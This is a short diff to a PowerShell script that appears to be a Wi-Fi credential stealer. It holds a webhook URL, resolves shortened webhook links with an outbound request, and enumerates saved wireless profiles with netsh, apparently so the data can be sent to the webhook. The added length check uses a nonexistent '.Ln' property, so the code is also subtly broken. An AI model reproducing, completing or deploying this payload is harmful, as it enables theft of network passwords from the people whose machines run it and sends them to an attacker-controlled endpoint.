@@ -1,4 +1,7 @@
 $whuri = "$dc"
+# shortened URL Detection
+if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}
+
 $outfile=""
 $a=0
 $ws=(netsh wlan show profiles) -replace ".*:\s+"
